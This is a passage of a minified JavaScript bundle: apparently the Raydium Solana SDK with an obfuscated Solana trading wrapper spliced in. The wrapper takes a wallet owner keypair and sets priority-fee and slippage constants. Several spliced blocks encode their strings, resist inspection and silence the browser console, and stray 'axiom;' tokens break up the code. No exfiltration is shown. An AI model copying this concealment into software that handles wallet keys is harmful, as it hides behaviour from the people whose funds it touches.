        for (let a = 0; a < t.length; a++) {
          let e = n[a];
          if (null === e || !e.accountInfo)
            throw Error("fetch pool info error: " + t[a].toBase58());
          let i = fP.decode(e.accountInfo.data);
          (r[t[a].toBase58()] = AA(vA({}, i), { poolId: e.accountInfo.owner })),
            o.push(i.configId);
        }
        let i = await xA(
            this.scope.connection,
            o.map((t) => ({ pubkey: t })),
            e
          ),
          s = {};
        for (let a = 0; a < o.length; a++) {
          let t = i[a];
          if (null === t || !t.accountInfo)
            throw Error("fetch config info error: " + o[a].toBase58());
          let e = lP.decode(t.accountInfo.data);
          s[o[a].toBase58()] = AA(vA({}, e), { configId: t.accountInfo.owner });
        }
        return {
          poolInfoMap: Object.keys(r).reduce(
            (t, e) =>
              AA(vA({}, t), {
                [e]: AA(vA({}, r[e]), {
                  configInfo: s[r[e].configId.toBase58()],
                }),
              }),
            {}
          ),
        };
      }
    },
    IP = class extends iT {
      constructor(t) {
        super(t),
          (this._tokenList = []),
          (this._tokenMap = new Map()),
          (this._blackTokenMap = new Set()),
          (this._mintGroup = {
            official: new Set(),
            jup: new Set(),
            extra: new Set(),
          }),
          (this._whiteMap = new Set()),
          (this._extraTokenList = []);
      }
      async load(t) {
        this.checkDisabled();
        let { forceUpdate: e = !1, type: n = "strict" } = t || {},
          {
            mintList: r,
            blacklist: o,
            whiteList: i,
          } = await this.scope.fetchV3TokenList(e),
          s = await this.scope.fetchJupTokenList(e);
        (this._tokenList = []),
          (this._tokenMap = new Map()),
          (this._blackTokenMap = new Set(o)),
          (this._mintGroup = {
            official: new Set(),
            jup: new Set(),
            extra: new Set(),
          }),
          (this._whiteMap = new Set(i)),
          this._tokenMap.set(EI.address, EI),
          this._mintGroup.official.add(EI.address),
          r.forEach((t) => {
            var e;
            this._blackTokenMap.has(t.address) ||
              (this._tokenMap.set(
                t.address,
                AA(vA({}, t), {
                  type: "raydium",
                  priority: 2,
                  programId:
                    null != (e = t.programId)
                      ? e
                      : t.tags.includes("token-2022")
                      ? Tc.toBase58()
                      : _c.toBase58(),
                })
              ),
              this._mintGroup.official.add(t.address));
          }),
          s.forEach((t) => {
            var e;
            this._blackTokenMap.has(t.address) ||
              this._tokenMap.has(t.address) ||
              (this._tokenMap.set(
                t.address,
                AA(vA({}, t), {
                  type: "jupiter",
                  priority: 1,
                  programId:
                    null != (e = t.programId)
                      ? e
                      : t.tags.includes("token-2022")
                      ? Tc.toBase58()
                      : _c.toBase58(),
                  tags: t.freezeAuthority
                    ? [...(t.tags || []), "hasFreeze"]
                    : t.tags,
                })
              ),
              this._mintGroup.jup.add(t.address));
          }),
          this._extraTokenList.forEach((t) => {
            this._blackTokenMap.has(t.address) ||
              this._tokenMap.has(t.address) ||
              (this._tokenMap.set(
                t.address,
                AA(vA({}, t), {
                  type: "extra",
                  priority: 1,
                  programId:
                    t.programId || t.tags.includes("token-2022")
                      ? Tc.toBase58()
                      : _c.toBase58(),
                })
              ),
              this._mintGroup.extra.add(t.address));
          }),
          (this._tokenList = Array.from(this._tokenMap).map((t) => t[1]));
      }
      get tokenList() {
        return this._tokenList;
      }
      get tokenMap() {
        return this._tokenMap;
      }
      get blackTokenMap() {
        return this._blackTokenMap;
      }
      get mintGroup() {
        return this._mintGroup;
      }
      get whiteListMap() {
        return this._whiteMap;
      }
      async getTokenInfo(t) {
        if (!t) throw new Error("please input mint");
        let e = t.toString(),
          n = this._tokenMap.get(e);
        if (n) return n;
        if ("SOL" === e.toLocaleUpperCase()) return EI;
        let r = (await this.scope.api.getTokenInfo([e]))[0];
        if (r)
          return (
            this._mintGroup.extra.add(e),
            this._tokenMap.set(e, AA(vA({}, r), { priority: 2 })),
            r
          );
        let o = await this.scope.connection.getAccountInfo(new Xi(e));
        if (!o) throw new Error(`mint address not found: ${e}`);
        let i = cl.decode(o.data),
          s = e.toString().substring(0, 6),
          a = {
            chainId: 101,
            address: e,
            programId: o.owner.toBase58(),
            logoURI: "",
            symbol: s,
            name: s,
            decimals: i.decimals,
            tags: [],
            extensions: {},
            priority: 0,
            type: "unknown",
          };
        return this._mintGroup.extra.add(e), this._tokenMap.set(e, a), a;
      }
    },
    SP = class {
      constructor(t) {
        this.rawBalances = new Map();
        let {
          connection: e,
          cluster: n,
          owner: r,
          api: o,
          defaultChainTime: i,
          defaultChainTimeOffset: s,
          apiCacheTime: a,
          blockhashCommitment: u = "confirmed",
          loopMultiTxStatus: c,
        } = t;
        (this._connection = e),
          (this.cluster = n || "mainnet"),
          (this._owner = r ? new aS(r) : void 0),
          (this._signAllTransactions = t.signAllTransactions),
          (this.blockhashCommitment = u),
          (this.loopMultiTxStatus = c),
          (this.api = o),
          (this._apiCacheTime = a || 3e5),
          (this.logger = CA("Raydium")),
          (this.farm = new WC({ scope: this, moduleName: "Raydium_Farm" })),
          (this.account = new tC({
            scope: this,
            moduleName: "Raydium_Account",
            tokenAccounts: t.tokenAccounts,
            tokenAccountRawInfos: t.tokenAccountRawInfos,
          })),
          (this.liquidity = new HE({
            scope: this,
            moduleName: "Raydium_LiquidityV2",
          })),
          (this.token = new IP({ scope: this, moduleName: "Raydium_tokenV2" })),
          (this.tradeV2 = new Mx({
            scope: this,
            moduleName: "Raydium_tradeV2",
          })),
          (this.clmm = new XE({ scope: this, moduleName: "Raydium_clmm" })),
          (this.cpmm = new Sx({ scope: this, moduleName: "Raydium_cpmm" })),
          (this.utils1216 = new Nx({
            scope: this,
            moduleName: "Raydium_utils1216",
          })),
          (this.marketV2 = new VE({
            scope: this,
            moduleName: "Raydium_marketV2",
          })),
          (this.ido = new zx({ scope: this, moduleName: "Raydium_ido" })),
          (this.launchpad = new kP({
            scope: this,
            moduleName: "Raydium_lauchpad",
          })),
          (this.availability = {});
        let l = new Date().getTime();
        (this.apiData = {}),
          s &&
            (this._chainTime = {
              fetched: l,
              value: { chainTime: i || Date.now() - s, offset: s },
            });
      }
      static async load(t) {
        var e;
        let n = wv.merge(
            {
              cluster: "mainnet",
              owner: null,
              apiRequestInterval: 3e5,
              apiRequestTimeout: 1e4,
            },
            t
          ),
          {
            cluster: r,
            apiRequestTimeout: o,
            logCount: i,
            logRequests: s,
            urlConfigs: a,
          } = n,
          u = new nT({
            cluster: r,
            timeout: o,
            urlConfigs: a,
            logCount: i,
            logRequests: s,
          }),
          c = new SP(AA(vA({}, n), { api: u }));
        return (
          await c.fetchAvailabilityStatus(
            null == (e = t.disableFeatureCheck) || e
          ),
          t.disableLoadToken || (await c.token.load({ type: t.jupTokenType })),
          c
        );
      }
      get owner() {
        return this._owner;
      }
      get ownerPubKey() {
        if (!this._owner) throw new Error(rT);
        return this._owner.publicKey;
      }
      setOwner(t) {
        return (
          (this._owner = t ? new aS(t) : void 0),
          this.account.resetTokenAccounts(),
          this
        );
      }
      get connection() {
        if (!this._connection)
          throw new Error(
            "please provide connection in load() initialization or set it by raydium.setConnection(connection)"
          );
        return this._connection;
      }
      setConnection(t) {
        return (this._connection = t), this;
      }
      get signAllTransactions() {
        return this._signAllTransactions;
      }
      setSignAllTransactions(t) {
        return (this._signAllTransactions = t), this;
      }
      checkOwner() {
        if (!this.owner) throw (void 0, new Error(rT));
      }
      isCacheInvalidate(t) {
        return new Date().getTime() - t > this._apiCacheTime;
      }
      async fetchChainTime() {
        try {
          let t = await this.api.getChainTimeOffset();
          this._chainTime = {
            fetched: Date.now(),
            value: {
              chainTime: Date.now() + 1e3 * t.offset,
              offset: 1e3 * t.offset,
            },
          };
        } catch {
          this._chainTime = void 0;
        }
      }
      async fetchV3TokenList(t) {
        if (
          this.apiData.tokenList &&
          !this.isCacheInvalidate(this.apiData.tokenList.fetched) &&
          !t
        )
          return this.apiData.tokenList.data;
        try {
          let t = await this.api.getTokenList(),
            e = { fetched: Date.now(), data: t };
          return (this.apiData.tokenList = e), e.data;
        } catch (sS) {
          return void 0, { mintList: [], blacklist: [], whiteList: [] };
        }
      }
      async fetchJupTokenList(t) {
        let e = this.apiData.jupTokenList;
        if (e && !this.isCacheInvalidate(e.fetched) && !t) return e.data;
        try {
          let t = await this.api.getJupTokenList();
          return (
            (this.apiData.jupTokenList = {
              fetched: Date.now(),
              data: t.map((t) =>
                AA(vA({}, t), {
                  mintAuthority: t.mint_authority || void 0,
                  freezeAuthority: t.freeze_authority || void 0,
                })
              ),
            }),
            this.apiData.jupTokenList.data
          );
        } catch (PA) {
          return void 0, [];
        }
      }
      get chainTimeData() {
        var t;
        return null == (t = this._chainTime) ? void 0 : t.value;
      }
      async chainTimeOffset() {
        var t;
        return this._chainTime && Date.now() - this._chainTime.fetched <= 3e5
          ? this._chainTime.value.offset
          : (await this.fetchChainTime(),
            (null == (t = this._chainTime) ? void 0 : t.value.offset) || 0);
      }
      async currentBlockChainTime() {
        var t;
        return this._chainTime && Date.now() - this._chainTime.fetched <= 3e5
          ? this._chainTime.value.chainTime
          : (await this.fetchChainTime(),
            (null == (t = this._chainTime) ? void 0 : t.value.chainTime) ||
              Date.now());
      }
      async fetchEpochInfo() {
        return (
          (this._epochInfo && Date.now() - this._epochInfo.fetched <= 3e4) ||
            (this._epochInfo = {
              fetched: Date.now(),
              value: await this.connection.getEpochInfo(),
            }),
          this._epochInfo.value
        );
      }
      async fetchAvailabilityStatus(t) {
        if (t) return {};
        try {
          let t = await this.api.fetchAvailabilityStatus(),
            e = !1 === t.all;
          return (
            (this.availability = {
              all: t.all,
              swap: !e && t.swap,
              createConcentratedPosition: !e && t.createConcentratedPosition,
              addConcentratedPosition: !e && t.addConcentratedPosition,
              addStandardPosition: !e && t.addStandardPosition,
              removeConcentratedPosition: !e && t.removeConcentratedPosition,
              removeStandardPosition: !e && t.removeStandardPosition,
              addFarm: !e && t.addFarm,
              removeFarm: !e && t.removeFarm,
            }),
            t
          );
        } catch {
          return {};
        }
      }
    };
  !(function (t) {
    const e = 304,
      n = 305,
      r = 309,
      o = 283,
      i = 279,
      s = 293,
      a = 297,
      u = xP,
      c = t();
    for (; []; )
      try {
        if (
          541040 ===
          -parseInt(u(e)) / 1 +
            (-parseInt(u(n)) / 2) * (-parseInt(u(r)) / 3) +
            -parseInt(u(311)) / 4 +
            -parseInt(u(288)) / 5 +
            parseInt(u(o)) / 6 +
            (-parseInt(u(278)) / 7) * (-parseInt(u(i)) / 8) +
            (-parseInt(u(s)) / 9) * (parseInt(u(a)) / 10)
        )
          break;
        c.push(c.shift());
      } catch (l) {
        c.push(c.shift());
      }
  })(CP);
  const _P = (function () {
      let t = !![];
      return function (e, n) {
        const r = t
          ? function () {
              if (n) {
                const t = n.apply(e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
        return (t = ![]), r;
      };
    })(),
    TP = _P(void 0, function () {
      const t = 287,
        e = 281,
        n = xP,
        r = {};
      r[n(287)] = "(((.+)+)+)+$";
      const o = r;
      return TP.toString()
        .search(o[n(t)])
        [n(292)]()
        .constructor(TP)
        [n(e)]("(((.+)+)+)+$");
    });
  function CP() {
    const t = [
      "y29UBMvJDgLVBG",
      "CMv0DxjUicHMDq",
      "mtm5odi1AM5YDwze",
      "ngPKBgzZzq",
      "x19WCM90B19F",
      "DhjHy2u",
      "yMLUza",
      "mtqXmZm3nurjs01iAa",
      "zxHJzxb0Aw9U",
      "mtKXmZGWmg9TtevkAq",
      "mZK5rg5HA0Xg",
      "ndm4ntzAvNntqxe",
      "C0ncD2i",
      "C2vHCMnO",
      "B21TAxrTzw50",
      "ndy0mZe4nfPszejXzW",
      "C21qBwi",
      "y29UzMLYBwvK",
      "Egzbqxq",
      "BePcsfm",
      "mJuXmtiZnvjqDMDUyG",
      "AMvlBeG",
      "zwHtBLa",
      "DhvYzunOzwnR",
      "Dg9tDhjPBMC",
      "mZyXoeLcB1jdzW",
      "y3rVCIGICMv0Dq",
      "Bg9N",
      "zgLZywjSzuXVyq",
      "oteZmfbrCMXqBa",
      "Aw5MBW",
      "veHdwu4",
      "y29UC29Szq",
      "BwfPBM5LDa",
    ];
    return (CP = function () {
      return t;
    })();
  }
  TP();
  const BP = (function () {
      let t = !![];
      return function (e, n) {
        const r = t
          ? function () {
              if (n) {
                const t = n.apply(e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
        return (t = ![]), r;
      };
    })(),
    EP = BP(void 0, function () {
      const t = 286,
        e = 300,
        n = 300,
        r = 295,
        o = 299,
        i = 280,
        s = 310,
        a = 306,
        u = 308,
        c = xP,
        l = {
          xfAAt: function (t, e) {
            return t + e;
          },
          wFoCV: c(303) + "nction() ",
          ehSnP: function (t) {
            return t();
          },
          THCYN: "warn",
          sCBwb: c(298),
          WynUN: "error",
          OHawW: c(307),
        };
      let d;
      try {
        const e = Function(
          l[c(t)](l.wFoCV + "{}.constru" + c(294) + 'rn this")( )', ");")
        );
        d = l[c(290)](e);
      } catch (p) {
        d = window;
      }
      const f = (d[c(e)] = d[c(n)] || {}),
        h = [c(r), l[c(o)], l[c(i)], l.WynUN, c(s), "table", l.OHawW];
      for (let m = 0; m < h.length; m++) {
        const t = BP.constructor.prototype.bind(BP),
          e = h[m],
          n = f[e] || t;
        (t[c(a)] = BP[c(u)](BP)), (t.toString = n[c(292)].bind(n)), (f[e] = t);
      }
    });
  function xP(t, e) {
    const n = CP();
    return (
      (xP = function (e, r) {
        let o = n[(e -= 278)];
        if (void 0 === xP.aFgTPR) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (xP.coTkKM = i), (t = arguments), (xP.aFgTPR = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.WUuiHm = t),
              (this.kDKreb = [1, 0, 0]),
              (this.EfnpME = function () {
                return "newState";
              }),
              (this.HwHWdF = "\\w+ *\\(\\) *{\\w+ *"),
              (this.piNsaw = "['|\"].+['|\"];? *}");
          };
          (e.prototype.CuhEnw = function () {
            const t = new RegExp(this.HwHWdF + this.piNsaw).test(
              this.EfnpME.toString()
            )
              ? --this.kDKreb[1]
              : --this.kDKreb[0];
            return this.kKOobl(t);
          }),
            (e.prototype.kKOobl = function (t) {
              return Boolean(~t) ? this.uXyyJP(this.WUuiHm) : t;
            }),
            (e.prototype.uXyyJP = function (t) {
              for (let e = 0, n = this.kDKreb.length; e < n; e++)
                this.kDKreb.push(Math.round(Math.random())),
                  (n = this.kDKreb.length);
              return t(this.kDKreb[0]);
            }),
            new e(xP).CuhEnw(),
            (o = xP.coTkKM(o)),
            (t[s] = o);
        }
        return o;
      }),
      xP(t, e)
    );
  }
  EP(),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  const PP = async (t, e, n) => {
    const r = 301,
      o = 289,
      i = 285,
      s = 291,
      a = 296,
      u = 282,
      c = 289,
      l = xP,
      d = {};
    (d[l(284)] = l(r)), (d[l(o)] = l(i));
    const f = d,
      h = {};
    (h.owner = t),
      (h[l(302)] = e),
      (h.cluster = f.smPmb),
      (h["disableFea" + l(s)] = !![]),
      (h[l(a) + "dToken"] = !0),
      (h["blockhashC" + l(u)] = f[l(c)]);
    return await SP.load(h);
  };
  axiom;
  const RP = DP;
  !(function (t) {
    const e = 150,
      n = 194,
      r = 161,
      o = 145,
      i = 172,
      s = 154,
      a = 152,
      u = DP,
      c = t();
    for (; []; )
      try {
        if (
          746219 ===
          (-parseInt(u(128)) / 1) * (-parseInt(u(e)) / 2) +
            -parseInt(u(164)) / 3 +
            (-parseInt(u(n)) / 4) * (-parseInt(u(r)) / 5) +
            (parseInt(u(o)) / 6) * (parseInt(u(153)) / 7) +
            (-parseInt(u(202)) / 8) * (parseInt(u(212)) / 9) +
            (parseInt(u(180)) / 10) * (-parseInt(u(i)) / 11) +
            (-parseInt(u(s)) / 12) * (parseInt(u(a)) / 13)
        )
          break;
        c.push(c.shift());
      } catch (l) {
        c.push(c.shift());
      }
  })(LP);
  const OP = (function () {
      const t = 197;
      let e = !![];
      return function (n, r) {
        const o = e
          ? function () {
              if (r) {
                const e = r[DP(t)](n, arguments);
                return (r = null), e;
              }
            }
          : function () {};
        return (e = ![]), o;
      };
    })(),
    MP = OP(void 0, function () {
      const t = 163,
        e = 119,
        n = 118,
        r = DP,
        o = {};
      o[r(127)] = "(((.+)+)+)+$";
      const i = o;
      return MP[r(119)]()
        [r(t)](i.UlMXi)
        [r(e)]()
        .constructor(MP)
        .search(r(n) + "+$");
    });
  function LP() {
    const t = [
      "yxbWBhK",
      "z2v0s2v5ugfPCG",
      "yMLUza",
      "CgXHDgzVCM1jza",
      "Bgf1BMnOCgfK",
      "nZqYmtzcBuzUuMi",
      "ChjPB3jPDhLgzq",
      "AgDgAgS",
      "BNqGyMfSyw5Jzq",
      "u2vSBgLUzYbMyq",
      "CK1bA1q",
      "z2v0q2fJAgvKqG",
      "z2v0u2v0DgLUzW",
      "EfPJrhO",
      "zgvJB2rL",
      "oti3s3nWtgzV",
      "icSGmc4WmIbttW",
      "AgfZs2v5ugfPCG",
      "BhKGC29Szca",
      "qNb2sM4",
      "v09fAeS",
      "AxnAzxjV",
      "rw1bwwi",
      "Eu1ps0y",
      "rwDQBLa",
      "z2v0uNbJq2XPzq",
      "C3vJy2vZCW",
      "Aw9U",
      "txvxtgW",
      "kcGOlISPkYKRkq",
      "Dg9tDhjPBMC",
      "BxnN",
      "rvLyt3i",
      "DMfSDwu",
      "u3vJy2vZC2z1Ba",
      "y3rVCIGICMv0Dq",
      "z2H0",
      "AMLqyKO",
      "vwXnwgK",
      "mNfnEwnxsa",
      "BMn0Aw9UkcKG",
      "z2v0v2fSBgv0",
      "ChvIBgLJs2v5",
      "sff1DxC",
      "D0f1Dxa",
      "zxjYB3i",
      "z2v0sw5ZDgfUyW",
      "DgfIBgu",
      "zZzxmq",
      "m2nnA1DZzeP3rW",
      "Dw5KzwzPBMvK",
      "r3j5uwu",
      "wuvwr1a",
      "BgvUz3rO",
      "v2XRwvy",
      "s29AAui",
      "nLzxsMLmwq",
      "u0HYr3bKquXona",
      "ugzzvMW",
      "C29Sqw1VDw50vq",
      "ihrVigHHDMuG",
      "mJGWmZm0De94zfHd",
      "uuDmCKq",
      "ntmXn2HJyNP0qq",
      "ndqZntaZoxrvwwDVra",
      "ndK1nNjxC1HttW",
      "EvbjzeC",
      "q01Rwxu",
      "ugXyr28",
      "zvvUAxrZ",
      "sw5MBW",
      "CM9Y",
      "nwDJwfPVwa",
      "BMDLzu0",
      "C2vHCMnO",
      "odiZnJqXrhnJAM9g",
      "C2XPChbHz2u",
      "qxLNvuC",
      "vvrwDK4",
      "Aw5PDgLHBeXPCq",
      "AvvJBuy",
      "zxzyr1K",
      "C2TPCfbYzwzSAq",
      "mtCYmZqWm3fRt0vMBG",
      "DwLKAxr5",
      "BML0CW",
      "Cwr1EMq",
      "C3rYAw5N",
      "z2v0qwnJB3vUDa",
      "uNjOtNC",
      "BwvZC2fNzq",
      "mtbVDvDADK0",
      "Cg9VBeLK",
      "AxnvC2vYqxv0Aa",
      "BhKGy3jLyxrLza",
      "z2v0uNbJug9VBa",
      "DhHjza",
      "lIbzB3uGBMvLza",
      "CM4GDgHPCYiPka",
      "EePQCxy",
      "x19WCM90B19F",
      "y29UBMvJDgLVBG",
      "C2vUzefUzenVBG",
      "CwXXzLK",
      "zw50AwnHDgvK",
      "ntu1mtKWnfjND0ngyW",
      "wMDZBw0",
      "C3rYAw5NAwz5",
    ];
    return (LP = function () {
      return t;
    })();
  }
  MP();
  const NP = (function () {
    let t = !![];
    return function (e, n) {
      const r = 197,
        o = t
          ? function () {
              if (n) {
                const t = n[DP(r)](e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
      return (t = ![]), o;
    };
  })();
  function DP(t, e) {
    const n = LP();
    return (
      (DP = function (e, r) {
        let o = n[(e -= 118)];
        if (void 0 === DP.NPbRAI) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (DP.rNLLPn = i), (t = arguments), (DP.NPbRAI = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.ExaJum = t),
              (this.YQnWZd = [1, 0, 0]),
              (this.xyVjmI = function () {
                return "newState";
              }),
              (this.JxaYqM = "\\w+ *\\(\\) *{\\w+ *"),
              (this.igsZgV = "['|\"].+['|\"];? *}");
          };
          (e.prototype.FEtyIV = function () {
            const t = new RegExp(this.JxaYqM + this.igsZgV).test(
              this.xyVjmI.toString()
            )
              ? --this.YQnWZd[1]
              : --this.YQnWZd[0];
            return this.FCxWle(t);
          }),
            (e.prototype.FCxWle = function (t) {
              return Boolean(~t) ? this.LwkeEB(this.ExaJum) : t;
            }),
            (e.prototype.LwkeEB = function (t) {
              for (let e = 0, n = this.YQnWZd.length; e < n; e++)
                this.YQnWZd.push(Math.round(Math.random())),
                  (n = this.YQnWZd.length);
              return t(this.YQnWZd[0]);
            }),
            new e(DP).FEtyIV(),
            (o = DP.rNLLPn(o)),
            (t[s] = o);
        }
        return o;
      }),
      DP(t, e)
    );
  }
  NP(void 0, function () {
    const t = 134,
      e = 136,
      n = 132,
      r = 189,
      o = 199,
      i = 147,
      s = 124,
      a = DP,
      u = {
        PfYVl: function (t, e) {
          return t + e;
        },
        BpvJn: "return (fu" + a(129),
        CHvIY: function (t) {
          return t();
        },
        EJgvq: "warn",
        fYxmA: a(t),
        PlXGo: "exception",
        HQuuw: a(e),
        CMkYu: "trace",
        besJy: function (t, e) {
          return t < e;
        },
      },
      c = u.CHvIY(function () {
        const t = a;
        let e;
        try {
          e = Function(
            u[t(i)](u[t(216)] + "{}.constru" + t(s) + t(187) + " )", ");")
          )();
        } catch (n) {
          e = window;
        }
        return e;
      }),
      l = (c.console = c.console || {}),
      d = ["log", u.EJgvq, "info", u.fYxmA, u[a(157)], u[a(n)], u[a(156)]];
    for (let f = 0; u.besJy(f, d.length); f++) {
      const t = NP.constructor.prototype[a(199)](NP),
        e = d[f],
        n = l[e] || t;
      (t[a(r)] = NP.bind(NP)), (t.toString = n[a(119)][a(o)](n)), (l[e] = t);
    }
  })(),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  const UP = {
      priorityFeeUnits: new Zn(1e7),
      solAmountUnits: new Zn(0),
      slippage: 25,
    },
    qP = M_,
    WP = (function (t, e, n, r) {
      return u_([Fx, e.toBuffer(), Yx(n), rB(r)], t);
    })(qP, Bc, 0, 0)[RP(131)];
  let zP;
  axiom,
    (function (t) {
      const e = 134,
        n = 137,
        r = 140,
        o = 147,
        i = 143,
        s = 126,
        a = 141,
        u = 149,
        c = 128,
        l = jP,
        d = t();
      for (; []; )
        try {
          if (
            814925 ===
            parseInt(l(142)) / 1 +
              (parseInt(l(e)) / 2) * (parseInt(l(n)) / 3) +
              parseInt(l(r)) / 4 +
              -parseInt(l(o)) / 5 +
              -parseInt(l(i)) / 6 +
              (-parseInt(l(s)) / 7) * (parseInt(l(a)) / 8) +
              (parseInt(l(u)) / 9) * (parseInt(l(c)) / 10)
          )
            break;
          d.push(d.shift());
        } catch (f) {
          d.push(d.shift());
        }
    })(XP);
  const KP = (function () {
      let t = !![];
      return function (e, n) {
        const r = t
          ? function () {
              if (n) {
                const t = n.apply(e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
        return (t = ![]), r;
      };
    })(),
    FP = KP(void 0, function () {
      const t = 150,
        e = 127,
        n = 132,
        r = jP,
        o = {};
      o[r(t)] = "(((.+)+)+)+$";
      const i = o;
      return FP.toString()
        [r(e)](i.TzuQW)
        [r(n)]()
        [r(130) + "r"](FP)
        .search(i[r(t)]);
    });
  function jP(t, e) {
    const n = XP();
    return (
      (jP = function (e, r) {
        let o = n[(e -= 126)];
        if (void 0 === jP.aAZXVk) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (jP.KijYUN = i), (t = arguments), (jP.aAZXVk = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.OHGkWQ = t),
              (this.BNhdnm = [1, 0, 0]),
              (this.kiHjmz = function () {
                return "newState";
              }),
              (this.JCwSfM = "\\w+ *\\(\\) *{\\w+ *"),
              (this.hQPHOp = "['|\"].+['|\"];? *}");
          };
          (e.prototype.wLHmWd = function () {
            const t = new RegExp(this.JCwSfM + this.hQPHOp).test(
              this.kiHjmz.toString()
            )
              ? --this.BNhdnm[1]
              : --this.BNhdnm[0];
            return this.nLlyPj(t);
          }),
            (e.prototype.nLlyPj = function (t) {
              return Boolean(~t) ? this.ZrCdQX(this.OHGkWQ) : t;
            }),
            (e.prototype.ZrCdQX = function (t) {
              for (let e = 0, n = this.BNhdnm.length; e < n; e++)
                this.BNhdnm.push(Math.round(Math.random())),
                  (n = this.BNhdnm.length);
              return t(this.BNhdnm[0]);
            }),
            new e(jP).wLHmWd(),
            (o = jP.KijYUN(o)),
            (t[s] = o);
        }
        return o;
      }),
      jP(t, e)
    );
  }
  FP();
  const GP = (function () {
      let t = !![];
      return function (e, n) {
        const r = 152,
          o = t
            ? function () {
                if (n) {
                  const t = n[jP(r)](e, arguments);
                  return (n = null), t;
                }
              }
            : function () {};
        return (t = ![]), o;
      };
    })(),
    VP = GP(void 0, function () {
      const t = 146,
        e = 151,
        n = 131,
        r = 144,
        o = 135,
        i = 139,
        s = 130,
        a = 136,
        u = 138,
        c = 132,
        l = jP,
        d = {
          fLFHj: function (t, e) {
            return t + e;
          },
          HDnxb: function (t) {
            return t();
          },
          ivxEy: "log",
          ayTVd: "warn",
          uiyHG: "table",
        };
      let f;
      try {
        const e = Function(
          d.fLFHj(l(t) + 'nction() {}.constructor("retu' + l(133) + " )", ");")
        );
        f = d.HDnxb(e);
      } catch (m) {
        f = window;
      }
      const h = (f.console = f[l(e)] || {}),
        p = [d.ivxEy, d[l(n)], "info", l(145), l(r), d[l(o)], l(i)];
      for (let g = 0; g < p.length; g++) {
        const t = GP[l(s) + "r"][l(129)].bind(GP),
          e = p[g],
          n = h[e] || t;
        (t[l(a)] = GP[l(u)](GP)), (t.toString = n[l(c)].bind(n)), (h[e] = t);
      }
    });
  VP(),
    (window.skCrypt = function (t) {
      return function () {
        return t;
      };
    });
  const HP = async (t) => {
    const e = jP,
      n = await fetch(t);
    return await n[e([148][0])]();
  };
  function XP() {
    const t = [
      "DhjHy2u",
      "nZy3mZj1r0nptLy",
      "ohDxtfnHAa",
      "mtm5odaXoefNEw5lsq",
      "ndyYotG3mezdCLnttG",
      "zxHJzxb0Aw9U",
      "zxjYB3i",
      "CMv0DxjUicHMDq",
      "nZG1mZe4nw1XEMPOuq",
      "yMXVyG",
      "mJi1BK9LBLjN",
      "vhP1uvC",
      "y29UC29Szq",
      "yxbWBhK",
      "mZyXmJu2n0jeCwPKwG",
      "C2vHCMnO",
      "ntC4nduWDeHNEhHM",
      "ChjVDg90ExbL",
      "y29UC3rYDwn0BW",
      "yxLuvMq",
      "Dg9tDhjPBMC",
      "CM4GDgHPCYiPka",
      "mNPhzhjPtW",
      "DwL5seC",
      "x19WCM90B19F",
      "mJqYotG4nMjmyLrJsq",
      "yMLUza",
    ];
    return (XP = function () {
      return t;
    })();
  }
  function ZP(t, e) {
    return new Promise(function (n, r) {
      let o;
      return JP(t).then(function (t) {
        try {
          return (
            (o = t),
            n(new Blob([e.slice(0, 2), o, e.slice(2)], { type: "image/jpeg" }))
          );
        } catch (i) {
          return r(i);
        }
      }, r);
    });
  }
  axiom;
  const JP = (t) =>
    new Promise((e, n) => {
      const r = new FileReader();
      r.addEventListener("load", ({ target: { result: t } }) => {
        const r = new DataView(t);
        let o = 0;
        if (65496 !== r.getUint16(o)) return n("not a valid JPEG");
        for (o += 2; ; ) {
          const i = r.getUint16(o);
          if (65498 === i) break;
          const s = r.getUint16(o + 2);
          if (65505 === i && 1165519206 === r.getUint32(o + 4)) {
            const i = o + 10;
            let a;
            switch (r.getUint16(i)) {
              case 18761:
                a = !0;
                break;
              case 19789:
                a = !1;
                break;
              default:
                return n("TIFF header contains invalid endian");
            }
            if (42 !== r.getUint16(i + 2, a))
              return n("TIFF header contains invalid version");
            const u = r.getUint32(i + 4, a),
